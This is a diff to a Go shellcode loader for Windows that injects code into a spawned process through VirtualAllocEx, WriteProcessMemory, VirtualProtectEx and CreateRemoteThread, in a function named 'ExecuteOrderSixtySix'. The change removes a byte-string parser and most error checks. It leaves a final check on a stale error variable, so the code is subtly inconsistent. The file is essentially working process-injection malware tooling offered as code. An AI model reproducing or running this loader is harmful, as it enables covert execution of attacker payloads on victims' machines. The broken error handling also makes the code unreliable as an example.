@@ -12,8 +12,6 @@ import (
         "os"
         "syscall"
         "unsafe"
-        "strings"
-        "strconv"
 )
 
 
@@ -37,22 +35,6 @@ var (
     CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
 )
 
-
-func StringBytesParseString(byteString string) (string, error) {
-    byteString = strings.TrimSuffix(byteString, "]")
-    byteString = strings.TrimLeft(byteString, "[")
-    sByteString := strings.Split(byteString, " ")
-    var res []byte
-    for _, s := range sByteString {
-        i, err := strconv.ParseUint(s, 10, 64)
-        if err != nil {
-            return "", err
-        }
-        res = append(res, byte(i))
-    }
-
-    return string(res), nil
-}
 
 func loadProcess(target string) *syscall.ProcessInformation {
     var si syscall.StartupInfo
@@ -97,36 +79,27 @@ func ExecuteOrderSixtySix(shellcode []byte) {
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE,
     )
-        if err.Error() != "The operation completed successfully." {
-        os.Exit(1)
-    }
 
     /* overwriting process memory with our shellcode */
-    _, _, err = WriteProcessMemory.Call(
+    _, _, _ = WriteProcessMemory.Call(
         uintptr(process.Process),
         baseAddr,
         uintptr(unsafe.Pointer(&shellcode[0])),
         uintptr(len(shellcode)),
         0,
     )
-        if err.Error() != "The operation completed successfully." {
-        os.Exit(1)
-    }
 
     /* changing permissions for our memory segment */
-    _, _, err = VirtualProtectEx.Call(
+    _, _, _ = VirtualProtectEx.Call(
         uintptr(process.Process),
         baseAddr,
         uintptr(len(shellcode)),
         PAGE_EXECUTE_READ,
         uintptr(unsafe.Pointer(&oldProtectCfg)),
     )
-        if err.Error() != "The operation completed successfully." {
-        os.Exit(1)
-    }
 
     /* load remote thread */
-    _, _, err = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
+    _, _, _ = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
         if err.Error() != "The operation completed successfully." {
         os.Exit(1)
     }
